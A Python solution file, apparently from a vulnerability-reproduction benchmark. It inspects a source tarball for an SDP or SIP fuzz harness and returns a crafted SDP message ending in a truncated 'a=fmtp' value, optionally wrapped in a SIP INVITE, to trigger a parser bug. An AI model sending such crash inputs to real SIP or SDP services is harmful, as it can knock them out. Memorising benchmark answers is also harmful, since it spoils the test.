import os
import tarfile


class Solution:
    def _detect_target(self, src_path: str):
        sdp = False
        sip = False
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name.lower()
                    if not (name.endswith(".c") or name.endswith(".cc") or name.endswith(".cpp") or name.endswith(".h") or name.endswith(".hpp")):
                        continue
                    # limit reads to keep it efficient
                    if m.size > 1024 * 1024:
                        continue
                    f = tf.extractfile(m)
                    if not f:
                        continue
                    try:
                        data = f.read()
                    except Exception:
                        continue
                    text = None
                    try:
                        text = data.decode("utf-8", "ignore")
                    except Exception:
                        try:
                            text = data.decode("latin-1", "ignore")
                        except Exception:
                            text = ""
                    if "llvmfuzzertestoneinput" in text.lower():
                        lt = text.lower()
                        if "sdp" in lt:
                            sdp = True
                        if "sip" in lt:
                            sip = True
        except Exception:
            # If anything goes wrong, fall back to sdp
            sdp = True
        # Prefer SDP-specific fuzzers when available
        if sdp:
            return "sdp"
        if sip:
            return "sip"
        return "sdp"

    def _build_sdp_poc(self) -> bytes:
        # SDP with a truncated fmtp attribute value (no delimiter/newline after '=')
        lines = [
            "v=0",
            "o=- 0 0 IN IP4 127.0.0.1",
            "s=-",
            "t=0 0",
            "c=IN IP4 127.0.0.1",
            "m=audio 9 RTP/AVP 96 0",
            "a=rtpmap:96 opus/48000/2",
            "a=rtpmap:0 PCMU/8000",
            # Critical line: truncated value (no CRLF after '=')
            "a=fmtp:96 x="
        ]
        sdp = "\r\n".join(lines)
        return sdp.encode("ascii", "ignore")

    def _build_sip_with_sdp_body(self) -> bytes:
        body = self._build_sdp_poc()
        headers = [
            "INVITE sip:bob@example.com SIP/2.0",
            "Via: SIP/2.0/UDP 127.0.0.1;branch=z9hG4bK-1",
            "Max-Forwards: 70",
            "From: <sip:alice@example.com>;tag=1",
            "To: <sip:bob@example.com>",
            "Call-ID: 1@localhost",
            "CSeq: 1 INVITE",
            "Contact: <sip:alice@127.0.0.1>",
            "Content-Type: application/sdp",
            f"Content-Length: {len(body)}",
            ""
        ]
        hdr = "\r\n".join(headers).encode("ascii", "ignore")
        return hdr + body

    def solve(self, src_path: str) -> bytes:
        target = self._detect_target(src_path)
        if target == "sip":
            return self._build_sip_with_sdp_body()
        return self._build_sdp_poc()